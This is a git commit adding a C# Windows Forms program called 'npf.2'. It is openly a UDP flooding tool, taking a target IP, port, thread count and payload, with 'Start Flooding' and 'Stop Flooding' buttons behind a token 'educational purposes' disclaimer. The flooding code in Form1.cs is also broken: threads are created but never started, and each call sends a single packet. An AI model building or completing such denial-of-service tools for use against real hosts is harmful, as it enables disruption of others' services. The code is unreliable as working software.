ae453992aa4d8b16baebed13d220555f1247b0f3
jack-debug <55571956+jack-debug@users.noreply.github.com>
2021-01-23 18:10:09 +1100

    it says wpfVer2 because i mixed up the names wpf and npf

---
+++ Form1.Designer.cs
@@ -0,0 +1,196 @@
+﻿namespace wpfVer2
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.label1 = new System.Windows.Forms.Label();
+            this.ipText = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.portText = new System.Windows.Forms.TextBox();
+            this.start = new System.Windows.Forms.Button();
+            this.stop = new System.Windows.Forms.Button();
+            this.threadText = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.messageText = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Consolas", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.ForeColor = System.Drawing.Color.Lime;
+            this.label1.Location = new System.Drawing.Point(136, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(154, 56);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "npf.2";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // ipText
+            // 
+            this.ipText.Location = new System.Drawing.Point(12, 113);
+            this.ipText.Name = "ipText";
+            this.ipText.Size = new System.Drawing.Size(164, 20);
+            this.ipText.TabIndex = 1;
+            this.ipText.Text = "0.0.0.0";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.ForeColor = System.Drawing.Color.Lime;
+            this.label2.Location = new System.Drawing.Point(12, 90);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(87, 20);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "IP Address";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.Lime;
+            this.label3.Location = new System.Drawing.Point(374, 90);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(38, 20);
+            this.label3.TabIndex = 4;
+            this.label3.Text = "Port";
+            // 
+            // portText
+            // 
+            this.portText.Location = new System.Drawing.Point(249, 113);
+            this.portText.Name = "portText";
+            this.portText.Size = new System.Drawing.Size(164, 20);
+            this.portText.TabIndex = 3;
+            this.portText.Text = "80";
+            this.portText.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
+            // 
+            // start
+            // 
+            this.start.Font = new System.Drawing.Font("Consolas", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.start.ForeColor = System.Drawing.Color.Black;
+            this.start.Location = new System.Drawing.Point(37, 230);
+            this.start.Name = "start";
+            this.start.Size = new System.Drawing.Size(139, 57);
+            this.start.TabIndex = 5;
+            this.start.Text = "Start Flooding";
+            this.start.UseVisualStyleBackColor = true;
+            this.start.Click += new System.EventHandler(this.start_Click);
+            // 
+            // stop
+            // 
+            this.stop.Font = new System.Drawing.Font("Consolas", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.stop.Location = new System.Drawing.Point(249, 230);
+            this.stop.Name = "stop";
+            this.stop.Size = new System.Drawing.Size(139, 57);
+            this.stop.TabIndex = 6;
+            this.stop.Text = "Stop Flooding";
+            this.stop.UseVisualStyleBackColor = true;
+            this.stop.Click += new System.EventHandler(this.stop_Click);
+            // 
+            // threadText
+            // 
+            this.threadText.Location = new System.Drawing.Point(12, 189);
+            this.threadText.Name = "threadText";
+            this.threadText.Size = new System.Drawing.Size(164, 20);
+            this.threadText.TabIndex = 7;
+            this.threadText.Text = "10";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label4.ForeColor = System.Drawing.Color.Lime;
+            this.label4.Location = new System.Drawing.Point(12, 166);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(67, 20);
+            this.label4.TabIndex = 8;
+            this.label4.Text = "Threads";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label5.ForeColor = System.Drawing.Color.Lime;
+            this.label5.Location = new System.Drawing.Point(339, 166);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(74, 20);
+            this.label5.TabIndex = 10;
+            this.label5.Text = "Message";
+            // 
+            // messageText
+            // 
+            this.messageText.Location = new System.Drawing.Point(249, 189);
+            this.messageText.Name = "messageText";
+            this.messageText.Size = new System.Drawing.Size(164, 20);
+            this.messageText.TabIndex = 9;
+            this.messageText.Text = "HTTP/GET/1.1";
+            this.messageText.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.ClientSize = new System.Drawing.Size(424, 299);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.messageText);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.threadText);
+            this.Controls.Add(this.stop);
+            this.Controls.Add(this.start);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.portText);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.ipText);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "npf.2";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox ipText;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox portText;
+        private System.Windows.Forms.Button start;
+        private System.Windows.Forms.Button stop;
+        private System.Windows.Forms.TextBox threadText;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.TextBox messageText;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,84 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace wpfVer2
+{
+    public partial class Form1 : Form
+    {
+        public bool active;
+        public Form1()
+        {
+            InitializeComponent();
+            MessageBox.Show("DISCLAIMER: I am not responsible for any damage caused by this program. This program is intended for educational purposes ONLY. Proceed with caution.");
+        }
+
+        private void label1_Click(object sender, EventArgs e) // this was an accident but now i can't delete it :/
+        {
+
+        }
+
+        private void start_Click(object sender, EventArgs e)
+        {
+            if (active)
+            {
+                MessageBox.Show("Flooding is still in progress.");
+            }
+            else
+            {
+                MessageBox.Show("Flooding started.");
+                active = true;
+                floodSetVar(); // this sets the variables and opens threads
+            }
+        }
+
+        public void flood(string ip, int port, UdpClient client, string message)
+        {
+            if (active)
+            {
+                try
+                {
+                    client.Connect(ip, port); // this is where the fun starts 
+                    byte[] sendBytes = Encoding.ASCII.GetBytes(message); // i don't actually know what to put here so i just put a simple http get request
+                    client.AllowNatTraversal(true);
+                    client.DontFragment = true;
+                    client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
+                }
+                catch
+                {
+                    MessageBox.Show("There was an error. Ensure that you have an internet connection and that all the data is entered correctly.");
+                    active = false;
+                }
+            }
+        }
+        public void floodSetVar()
+        {
+            string ipaddr = ipText.Text;
+            int por = Int32.Parse(portText.Text);
+            string message = messageText.Text;
+            int threads = Int32.Parse(threadText.Text);
+            if (threads > 32)
+            {
+                MessageBox.Show("WARNING: Too many threads could cause problems if an error occurs. Proceed with caution."); // idk how many threads is too many but i think 32 might be it
+            }
+            UdpClient client2 = new UdpClient(ipaddr, por); // this is just the udp client, nothing interesting
+            for (int i = 1; i < threads; i++) // this opens all the threads
+            {
+                new Thread(() => flood(ipaddr, por, client2, message));
+            }
+        }
+
+        private void stop_Click(object sender, EventArgs e)
+        {
+            active = false;
+        }
+    }
+}
